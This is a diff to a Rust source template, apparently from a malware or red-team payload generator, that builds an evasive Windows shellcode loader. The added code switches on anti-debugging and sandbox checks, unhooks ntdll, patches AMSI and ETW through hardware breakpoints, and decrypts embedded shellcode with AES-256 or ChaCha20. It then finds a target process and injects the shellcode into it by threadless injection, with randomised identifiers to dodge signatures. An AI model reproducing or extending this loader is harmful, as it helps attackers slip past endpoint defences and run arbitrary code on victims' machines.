@@ -1,11 +1,31 @@
 #![windows_subsystem = "windows"]
 extern crate scaffold;
 
-fn main() {
+fn {{ v.fn_run }}() {
     unsafe {
+        {%- if "AntiDebug" in feature_names %}
+        if scaffold::evasion::anti_debug::is_debugged() { return; }
+        {%- endif %}
         {%- if "SandboxDomain" in feature_names %}
         if !scaffold::sandbox::domain::is_domain_joined() { return; }
         {%- endif %}
+        {%- if "SandboxUser" in feature_names %}
+        if !scaffold::sandbox::usercheck::looks_real() { return; }
+        {%- endif %}
+        {%- if "UnhookDisk" in feature_names %}
+        scaffold::evasion::unhook::unhook_ntdll_disk();
+        {%- endif %}
+        {%- if "UnhookKnownDlls" in feature_names %}
+        scaffold::evasion::unhook::unhook_ntdll_knowndlls();
+        {%- endif %}
+        {%- if "AmsiHwbp" in feature_names %}
+        scaffold::bypass::amsi_hwbp::install_amsi_bypass();
+        {%- endif %}
+        {%- if "EtwHwbp" in feature_names %}
+        scaffold::bypass::etw_hwbp::install_etw_bypass();
+        scaffold::bypass::etw_hwbp::patch_etw_full();
+        {%- endif %}
+
         let {{ v.var_shellcode }}: &[u8] = &[
             {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
         ];
@@ -15,9 +35,22 @@ fn main() {
         let {{ v.var_iv }}: [u8; 16] = [
             {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
         ];
+
+        {%- if config.encryption == "Aes256" %}
         let {{ v.var_ptr }} = scaffold::crypto::decrypt_aes256(
             {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
         ).unwrap();
-        scaffold::inject::threadless::inject_threadless(1234u32, &{{ v.var_ptr }});
+        {%- else %}
+        let {{ v.var_ptr }} = scaffold::crypto::decrypt_chacha20(
+            {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
+        ).unwrap();
+        {%- endif %}
+
+        let target_pid = scaffold::inject::ppid_spoof::find_injection_target()
+            .unwrap_or(0);
+        if target_pid == 0 { return; }
+        scaffold::inject::threadless::inject_threadless(target_pid, &{{ v.var_ptr }});
     }
 }
+
+fn main() { {{ v.fn_run }}(); }
